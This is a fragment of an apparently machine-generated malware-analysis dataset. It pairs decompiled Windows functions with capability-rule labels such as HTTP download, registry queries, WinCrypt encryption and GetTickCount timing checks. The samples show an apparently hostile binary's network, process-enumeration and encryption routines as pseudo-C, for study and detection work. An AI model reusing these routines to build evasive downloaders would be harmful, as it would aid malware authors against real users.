            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408978(uint arg_8h)\n\n{\n    uchar *in_EAX;\n    uint unaff_EBX;\n    \n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0xf;\n    *in_EAX = 0;\n    fcn.0040d730(arg_8h);\n    fcn.004089c6();\n    fcn.0040d730(arg_8h);\n    fcn.00407dae(arg_8h);\n    fcn.00407d1a(unaff_EBX, 0);\n    return;\n}\n",
        "token_count": 140
    },
    "004089f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.004089f9(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *unaff_EBX;\n    uint uVar3;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_64h = (*_sym.imp.WININET.dll_InternetOpenA)(0x4045fc, 0, 0, 0, 0);\n    uVar3 = 0x404604;\n    fcn.0040702c(0x404604);\n    puVar1 = fcn.0040b24c(uVar3, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, in_stack_ffffff64, \n                          in_stack_ffffff68);\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar3 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_64h, puVar1, 0, 0, 0x80000000, 0);\n    fcn.0040571f(1);\n    puVar1 = &var_44h;\n    iVar2 = (*_sym.imp.WININET.dll_InternetReadFile)(uVar3, puVar1, 0x40, &var_68h);\n    if (iVar2 == 0) {\n        fcn.0040702c(0x404631);\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_64h);\n        *(unaff_EBX + 0x10) = 0;\n        *(unaff_EBX + 0x14) = 0xf;\n        *unaff_EBX = 0;\n        fcn.00407523();\n    }\n    fcn.0040b864(puVar1);\n    return;\n}\n",
        "token_count": 501
    },
    "00408aba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.00408aba(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *unaff_EBX;\n    uint uVar3;\n    uint noname_1;\n    uint arg_8h;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint uVar4;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_98h;\n    uint var_7ch;\n    uint var_60h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_b8h = (*_sym.imp.WININET.dll_InternetOpenA)(0x4045fc, 0, 0, 0, 0);\n    arg_8h = 0x404634;\n    fcn.0040702c(0x404634);\n    noname_1 = 0x408b00;\n    fcn.0040b24c(arg_8h, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, in_stack_ffffff14);\n    uVar4 = 0x401f7c;\n    uVar3 = 0x404648;\n    fcn.0040702c(0x404648);\n    fcn.0040b24c(uVar3, noname_1, arg_8h, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c);\n    fcn.00407c1c(&fcn.00408aba::var_7ch, in_stack_ffffff14);\n    puVar1 = fcn.00407c40(uVar4);\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar3 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_b8h, puVar1, 0, 0, 0x80000000, 0);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    puVar1 = &fcn.00408aba::var_44h;\n    iVar2 = (*_sym.imp.WININET.dll_InternetReadFile)(uVar3, puVar1, 0x40, &fcn.00408aba::var_bch);\n    if (iVar2 == 0) {\n        fcn.0040702c(0x404631);\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_b8h);\n        *(unaff_EBX + 0x10) = 0;\n        *(unaff_EBX + 0x14) = 0xf;\n        *unaff_EBX = 0;\n        fcn.00407523();\n    }\n    fcn.0040b864(puVar1);\n    return;\n}\n",
        "token_count": 716
    },
    "00408f61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408f61(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint32_t arg_8h_00;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_21h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    iVar2 = 0;\n    var_28h = 0;\n    if ((*0x4147f8 - *0x4147f4) / 0x1c != 0) {\n        do {\n            iVar1 = *0x4147f4 + iVar2;\n            fcn.00407008(iVar1);\n            in_stack_ffffffb8 =\n                 fcn.00409f3f(&fcn.00408f61::var_21h + 1, iVar1, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0\n                              , in_stack_ffffffb4, in_stack_ffffffb8);\n            in_stack_ffffffb4 = 0x408fbf;\n            fcn.00407d1a(in_stack_ffffffb8, 0);\n            fcn.0040571f(1);\n            in_stack_ffffffb0 = 0x1c;\n            var_28h = var_28h + 1;\n            iVar2 = iVar2 + 0x1c;\n        } while (var_28h < (*0x4147f8 - *0x4147f4) / 0x1c);\n    }\n    var_21h._0_1_ = 10;\n    iVar2 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar2 = 0x402094;\n    }\n    iVar1 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar1 = 0x402094;\n    }\n    fcn.00407bd2(&fcn.00408f61::var_28h, iVar1, iVar2 + *0x4020a4);\n    iVar2 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar2 = 0x402094;\n    }\n    arg_8h_00 = var_28h;\n    fcn.00407136(var_28h, iVar2 + *0x4020a4);\n    var_21h._0_1_ = 0xd;\n    iVar2 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar2 = 0x402094;\n    }\n    iVar1 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar1 = 0x402094;\n    }\n    fcn.00407bd2(&fcn.00408f61::var_28h, iVar1, iVar2 + *0x4020a4);\n    iVar2 = *0x402094;\n    if (*0x4020a8 < 0x10) {\n        iVar2 = 0x402094;\n    }\n    fcn.00407136(var_28h, iVar2 + *0x4020a4);\n    fcn.00407008(0x402094);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 832
    },
    "0040a12b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a12b(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint *arg_8h_00;\n    uchar auStackY10008 [9936];\n    uint uStackY72;\n    uint var_4h;\n    \n    fcn.00411bb0();\n    auStackY10008[0] = 0;\n    fcn.0040d7e0();\n    (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    arg_8h_00 = arg_8h;\n    if (arg_1ch < 0x10) {\n        arg_8h_00 = &fcn.0040a12b::arg_8h;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n    fcn.0040702c(&stack0xffffd8e8);\n    uStackY72 = 0x40a1d1;\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 282
    },
    "0040a325": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a325(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    uint *puVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t arg_ch_00;\n    uint32_t uVar6;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    ulong uVar7;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar5 = unaff_ESI[4];\n    var_4h = 1;\n    if ((unaff_EDI <= uVar5) && (arg_ch <= arg_8h[4])) {\n        uVar2 = uVar5 - unaff_EDI;\n        if (uVar2 == 0) {\n            var_4h = uVar2;\n        }\n        uVar6 = arg_8h[4] - arg_ch;\n        if (uVar6 < arg_10h) {\n            arg_10h = uVar6;\n        }\n        uVar7 = CONCAT44(uVar5 - var_4h, uVar2);\n        if (-arg_10h - 1 <= uVar5 - var_4h) {\n            uVar7 = fcn.0040b79e(0x404554);\n            uVar5 = extraout_ECX;\n        }\n        uVar6 = (uVar7 >> 0x20) + arg_10h;\n        uVar2 = uVar7 - var_4h;\n        if (uVar5 < uVar6) {\n            fcn.004075c0(0);\n        }\n        if (unaff_ESI == arg_8h) {\n            if (var_4h < arg_10h) {\n                if (unaff_EDI < arg_ch) {\n                    if (arg_ch < unaff_EDI + var_4h) {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040be70(puVar4 + unaff_EDI, puVar3 + arg_ch, var_4h);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040be70(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        uVar2 = arg_10h - var_4h;\n                        arg_ch_00 = puVar3 + arg_10h + arg_ch;\n                        arg_8h_00 = puVar4 + var_4h + unaff_EDI;\n                    }\n                    else {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040be70(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        arg_ch_00 = puVar3 + arg_10h + (arg_ch - var_4h);\n                        arg_8h_00 = puVar4 + unaff_EDI;\n                        uVar2 = arg_10h;\n                    }\n                }\n                else {\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    fcn.0040be70(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    arg_ch_00 = puVar3 + arg_ch;\n                    arg_8h_00 = puVar4 + unaff_EDI;\n                    uVar2 = arg_10h;\n                }\n            }\n            else {\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                fcn.0040be70(puVar4 + unaff_EDI, puVar3 + arg_ch, arg_10h);\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                arg_ch_00 = puVar3 + var_4h + unaff_EDI;\n                arg_8h_00 = puVar4 + arg_10h + unaff_EDI;\n            }\n            fcn.0040be70(arg_8h_00, arg_ch_00, uVar2);\n        }\n        else {\n            puVar4 = unaff_ESI;\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n                puVar3 = *unaff_ESI;\n            }\n            fcn.0040be70(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n            }\n            fcn.0040b880(puVar3 + unaff_EDI, arg_8h + arg_ch, arg_10h);\n        }\n        unaff_ESI[4] = uVar6;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + uVar6) = 0;\n        return;\n    }\n    fcn.0040b7eb(0x40453c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1702
    },
    "0040ae4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ae4f(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.0040793c(0x4051a0);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b79e(0x404554);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.004075c0(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                    puVar4 = *in_EAX;\n                }\n                fcn.0040be70(puVar3 + unaff_EDI, puVar4, in_EAX[4]);\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar4 = *in_EAX;\n                }\n                fcn.0040b880(puVar4, 0x4051a0, unaff_EDI);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2 + unaff_EDI) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar4 = *in_EAX;\n        }\n        fcn.00407e3e(in_EAX, 0x4051a0 - puVar4);\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "0040b535": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b535(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar *unaff_EBX;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint var_198h;\n    uint var_194h;\n    uint var_18ch;\n    uint var_188h;\n    uint lpBuffer;\n    int32_t var_5ch;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    (*_sym.imp.KERNEL32.dll_Sleep)(5);\n    iVar5 = 0;\n    uVar6 = fcn.0040dbf8(0);\n    var_188h = 0x128;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_188h);\n    while (iVar2 != 0) {\n        iVar5 = iVar5 + 1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_188h);\n    }\n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    iVar2 = fcn.0040db5d();\n    iVar7 = fcn.00411be0(iVar2 * iVar5, iVar2 * iVar5 >> 0x20, uVar6);\n    uVar1 = iVar7 + 8 >> 0x20;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar2 = fcn.00412150(iVar7 + 8, uVar3, 0);\n    fcn.0040dbc5(iVar2 * var_5ch);\n    *(unaff_EBX + 0x10) = 0;\n    *(unaff_EBX + 0x14) = 0xf;\n    *unaff_EBX = 0;\n    iVar2 = *(unaff_EBX + 0x10);\n    while (iVar2 != arg_8h) {\n        uVar4 = fcn.0040dbd7();\n        var_10h = 0;\n        var_ch = 0xf;\n        var_20h._0_1_ = 0;\n        fcn.004072d6(uVar4 % (arg_1ch - 1U), 1);\n        fcn.00407d1a(&var_20h, 0);\n        fcn.0040571f(1);\n        iVar2 = *(unaff_EBX + 0x10);\n    }\n    fcn.0040571f(1);\n    fcn.0040b864(uVar1);\n    return;\n}\n",
        "token_count": 709
    },
    "0040e3d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e3d7(uint arg_8h)\n\n{\n    fcn.0040e297(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "0040fa03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040fa17)\n// WARNING: Removing unreachable block (ram,0x0040fa1d)\n// WARNING: Removing unreachable block (ram,0x0040fa1f)\n\nvoid fcn.0040fa03(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "00411da5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411da5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00412ea9(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004067bd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "move file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067bd(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    uint *puVar1;\n    uint var_58h;\n    uint var_3ch;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0040b44d(&var_58h);\n    arg_8h_01 = fcn.00407b7c(0x403fe0);\n    if ((*(arg_8h_01 + 0x14) - *(arg_8h_01 + 0x10) < *(arg_8h_00 + 0x10)) &&\n       (*(arg_8h_01 + 0x10) <= *(arg_8h_00 + 0x14) - *(arg_8h_00 + 0x10))) {\n        fcn.0040806c(arg_8h_01);\n    }\n    else {\n        fcn.00407f37(arg_8h_00, 0);\n    }\n    fcn.00407ccb();\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    if (var_ch < 8) {\n        var_20h = &var_20h;\n    }\n    puVar1 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar1 = &arg_8h;\n    }\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(puVar1);\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    fcn.0040b864(var_20h);\n    return;\n}\n",
        "token_count": 454
    },
    "00407c40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407c40(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(param_1 + 0x14) - *(param_1 + 0x10) < *(in_EAX + 0x10)) &&\n       (*(param_1 + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.00407e3e(param_1, 0);\n    }\n    else {\n        fcn.00407d1a(in_EAX, 0);\n    }\n    fcn.00407058();\n    return;\n}\n",
        "token_count": 149
    },
    "00409390": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00409390(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_214h = arg_8h;\n    var_218h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_204h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_208h = 0;\n    arg_8h_00 = *0x414778;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x414778, 0, 1, 0, 0, &var_208h, 0);\n    if (iVar3 != 0) goto code_r0x00409416;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00409416:\n                iVar3 = (*pcVar5)(*0x414778, 0, 1, 0, &var_204h, &var_218h, var_208h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_20ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_204h, var_208h, 1, 0, &var_20ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_210h = fcn.0040b859(var_20ch);\n        iVar3 = (*pcVar1)(&var_204h, var_208h, 1, var_210h, &var_20ch);\n    } while (iVar3 == 0);\n    fcn.0040702c(var_210h);\n    fcn.0040d85a(var_210h);\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 733
    },
    "004094d3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004094d3(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_218h;\n    uint var_214h;\n    uint uStack532;\n    uint uStack528;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_214h = arg_8h;\n    var_218h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_204h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_208h = 0;\n    arg_8h_00 = *0x414774;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x414774, 0, 1, 0, 0, &var_208h, 0);\n    if (iVar3 != 0) goto code_r0x00409559;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00409559:\n                iVar3 = (*pcVar5)(*0x414774, 0, 1, 0, &var_204h, &var_218h, var_208h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            uStack528 = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_204h, var_208h, 1, 0, &uStack528);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        uStack532 = fcn.0040b859(uStack528);\n        iVar3 = (*pcVar1)(&var_204h, var_208h, 1, uStack532, &uStack528);\n    } while (iVar3 == 0);\n    fcn.0040702c(uStack532);\n    fcn.0040d85a(uStack532);\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 724
    },
    "00409f3f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00409f3f(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_414h = arg_8h;\n    var_418h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_404h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_408h = 0;\n    arg_8h_00 = *0x41477c;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x41477c, 0, 1, 0, 0, &var_408h, 0);\n    if (iVar3 != 0) goto code_r0x00409fc5;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x00409fc5:\n                iVar3 = (*pcVar5)(*0x41477c, 0, 1, 0, &var_404h, &var_418h, var_408h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_40ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_404h, var_408h, 1, 0, &var_40ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_410h = fcn.0040b859(var_40ch);\n        iVar3 = (*pcVar1)(&var_404h, var_408h, 1, var_410h, &var_40ch);\n    } while (iVar3 == 0);\n    fcn.0040702c(var_410h);\n    fcn.0040d85a(var_410h);\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 740
    },
    "0040b24c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
